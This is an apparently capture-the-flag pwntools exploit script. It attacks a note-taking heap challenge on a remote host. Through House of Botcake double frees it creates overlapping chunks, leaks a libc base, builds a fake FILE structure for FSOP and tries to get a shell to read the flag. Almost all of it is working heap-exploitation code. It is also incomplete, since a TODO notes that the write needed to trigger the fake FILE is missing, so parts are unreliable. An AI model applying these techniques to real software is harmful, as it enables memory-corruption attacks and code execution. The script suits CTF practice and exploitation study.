#!/usr/bin/env python3
"""
House of Botcake to create overlapping chunks
Then leak libc from controlled offset
"""

from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = elf
context.log_level = 'info'

io = remote('amt.rs', 26797)

def create(idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

def view(idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

success("House of Botcake exploit")

# House of Botcake:
# 1. Fill tcache (7 chunks)
# 2. Create chunk A, B, C
# 3. Free A (goes to unsorted bin - tcache full)
# 4. Free C
# 5. Free B - consolidates with A
# 6. Allocate from tcache - now has space
# 7. Free A again (double free)
# 8. Now A is in both tcache AND unsorted bin (overlapping!)

info("Step 1: Fill tcache")
for i in range(7):
    create(i, 0x100, f'T{i}'.encode().ljust(0x100, b'\x00'))

for i in range(7):
    delete(i)

info("Step 2: Create chunks A, B, C")
create(7, 0x100, b'A' * 0x100)  # A
create(8, 0x100, b'B' * 0x100)  # B
create(9, 0x20, b'guard')       # Prevent consolidation

info("Step 3: Free A to unsorted bin")
delete(7)  # A -> unsorted bin (tcache full)

info("Step 4: Free B")
delete(8)  # B -> consolidates with A in unsorted bin

info("Step 5: Allocate from tcache to make room")
create(10, 0x100, b'X' * 0x100)  # Gets from tcache

info("Step 6: Free A again (double free!)")
delete(7)  # A now in BOTH tcache AND unsorted bin!

success("Created overlapping chunks!")

info("Step 7: Allocate overlapping chunk and write controlled data")
# Now when we allocate, we get chunk A from tcache
# But A is ALSO in unsorted bin with libc pointers!

# We can write data at specific offsets
# Put printable data at start, then let libc pointers be after

payload = b'\x41' * 0x10  # Printable 'A' chars
# After this, the unsorted bin fd/bk will be present

create(11, 0x100, payload + b'Y' * (0x100 - len(payload)))

info("Step 8: Try to leak via the overlapping region")

# View the unsorted bin chunk
try:
    data = view(7)  # Or view 11
    info(f"Overlapping chunk data: {data[:50]}")

    if len(data) > 0x10:
        # Try to extract libc pointer after our 'A's
        potential_leak = data[0x10:0x18]
        if len(potential_leak) >= 6:
            leak = u64(potential_leak.ljust(8, b'\x00'))
            success(f"Leaked value: {hex(leak)}")

            # Check if it looks like libc address
            if leak > 0x7f0000000000:
                # Calculate libc base
                for offset in [0x21ace0, 0x21ac80, 0x211b20, 0x203b20]:
                    test = leak - offset
                    if (test & 0xfff) == 0:
                        libc.address = test
                        success(f"LIBC BASE: {hex(libc.address)}")
                        success(f"system @ {hex(libc.symbols['system'])}")
                        break
except Exception as e:
    error(f"Leak failed: {e}")

info("Step 9: If we have libc, create FSOP payload")

if libc.address > 0x7f0000000000:
    _IO_wfile_jumps = libc.address + 0x233228
    stderr = libc.address + libc.symbols['_IO_2_1_stderr_']
    system = libc.symbols['system']
    binsh = next(libc.search(b'/bin/sh'))

    success(f"Addresses ready!")
    success(f"  system: {hex(system)}")
    success(f"  /bin/sh: {hex(binsh)}")
    success(f"  stderr: {hex(stderr)}")

    # Build fake FILE structure per writeup
    fake_file = flat({
        0x00: p32(0xfbad0101),
        0x04: b';sh\x00',
        0x28: 1,  # _IO_write_ptr
        0x70: stderr,  # _lock
        0xa0: stderr,  # _wide_data
        0xd8: _IO_wfile_jumps,  # vtable
    }, length=0x200, filler=b'\x00')

    create(12, 0x200, fake_file)
    success("Fake FILE created!")

    # TODO: Need to overwrite _IO_list_all or stderr to point to our fake FILE
    # This requires another arbitrary write primitive

info("Step 10: Trigger")
io.sendline(b'999')
io.sendline(b'0')

time.sleep(1)

try:
    io.sendline(b'cat flag*')
    time.sleep(2)
    output = io.recvall(timeout=3)

    if b'{' in output:
        success(f"\n\nFLAG:\n{output}\n")
    else:
        info(f"Output: {output[:300]}")
except:
    pass

io.interactive()
